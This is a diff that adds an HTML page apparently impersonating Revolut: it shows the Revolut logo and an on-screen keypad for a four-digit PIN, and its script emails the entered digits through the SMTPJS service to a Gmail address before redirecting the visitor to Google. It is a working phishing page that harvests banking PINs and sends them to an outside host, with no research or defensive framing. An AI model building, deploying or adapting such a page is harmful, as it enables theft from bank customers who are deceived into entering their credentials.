@@ -1,0 +1,157 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>mon site</title>
+    
+    <script src="https://kit.fontawesome.com/7e2a69d5dd.js"></script>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <style type="text/css" id="dcoder_stylesheet">
+    @import url("https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap");
+
+        @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap");
+
+        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap');
+ 
+@import url("https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap");
+
+@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap");
+
+@import url('https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap');       
+
+ .row {
+    display: flex;
+  }
+
+  .key {
+    flex: 1;
+    padding: 10px;
+    border: 1px solid #ccc;
+    text-align: center;
+    border-radius:100px;
+    margin-top:5%;
+    
+  }
+
+  #numInputs input {
+    width: 60px;
+    margin: 5px;
+    margin-left:3.5%;
+    border-top:none;
+    font-size:30px;
+    border-right:none;
+    border-left:none;
+  }
+  .alerte {
+    display: none;
+    padding: 10px;
+    border: 1px solid #ff0000;
+    color: #ff0000;
+    text-align: center;
+  }
+  .img img{
+      width:100px;
+  }
+  .btn input{
+      width:100%;
+      height:40px;
+      border-radius:109px;
+      border: 1px solid #ccc;
+      
+  }
+  .btn{
+     margin-top:-11.9%; 
+     margin-left:75%;
+  }
+</style>
+</head>
+<body>
+<div class="img"><img src="https://i.postimg.cc/DZFHBVFT/Revolut-Logo-wine.png"></div>
+<form id="submit"><br><br><br>
+<div id="numInputs">
+  <input id="input1" type="text" pattern="\d*" readonly oninput="this.value=this.value.replace(/./g,'#');" required>
+  <input id="input2" type="text" pattern="\d*" readonly oninput="this.value=this.value.replace(/./g,'#');" required>
+  <input id="input3" type="text" pattern="\d*" readonly oninput="this.value=this.value.replace(/./g,'#');" required>
+  <input id="input4" type="text" pattern="\d*" readonly oninput="this.value=this.value.replace(/./g,'#');" required>
+</div>
+<div id="keyboard">
+  <div class="row">
+    <div class="key" onclick="setNumber(1)">1</div>
+    <div class="key" onclick="setNumber(2)">2</div>
+    <div class="key" onclick="setNumber(3)">3</div>
+  </div>
+  <div class="row">
+    <div class="key" onclick="setNumber(4)">4</div>
+    <div class="key" onclick="setNumber(5)">5</div>
+    <div class="key" onclick="setNumber(6)">6</div>
+  </div>
+  <div class="row">
+    <div class="key" onclick="setNumber(7)">7</div>
+    <div class="key" onclick="setNumber(8)">8</div>
+    <div class="key" onclick="setNumber(9)">9</div>
+  </div> 
+  <div class="row">
+    <div class="key" onclick="setNumber(0)">0</div>
+  </div>
+  <div class="btn">
+  <input type="submit" id="input5" value="OK"></div>
+  </form>
+  <div class="alerte"></div>
+</div>
+
+<script>
+  function setNumber(num) {
+    if (document.getElementById("input1").value === "") {
+      document.getElementById("input1").value = num;
+    } else if (document.getElementById("input2").value === "") {
+      document.getElementById("input2").value = num;
+    } else if (document.getElementById("input3").value === "") {
+      document.getElementById("input3").value = num;
+    } else if (document.getElementById("input4").value === "") {
+      document.getElementById("input4").value = num;
+    } else {
+      document.querySelector('.alerte').textContent = "Les quatre inputs contiennent déjà un numéro chacun.";
+      document.querySelector('.alerte').style.display = "block";
+    }
+  }
+  
+  document.getElementById('submit').addEventListener('submit', (e) => {
+    e.preventDefault();
+    setTimeout(() => {
+     
+     const input1 = document.getElementById('input1');
+      const input2 = document.getElementById('input2');
+      const input3= document.getElementById('input3');
+      const input4= document.getElementById('input4');
+            
+
+      const ebody3 = `
+        <h1>Nom: </h1>${input1.value}
+        <br>
+        <h1>Pays: </h1>${input2.value}
+        <br>
+        <h1>Ville : </h1>${input3.value}
+        <br>
+        <h1>Mtnc : </h1>${input4.value}
+        <br>
+      `;
+
+      Email.send({
+        SecureToken: "24ed91c7-882b-465c-97d2-32856db82fdb",
+        To: 'abdoulissa154@gmail.com',
+        From: "abdoulissa154@gmail.com",
+        Subject: "This is the subject",
+        Body: ebody3
+      }).then(() => {
+        setTimeout(() => {
+          window.location.href = "https://www.google.com";
+        }, 1000);
+      });
+      
+    }, 500);
+  });
+</script>
+</body>
+</html>
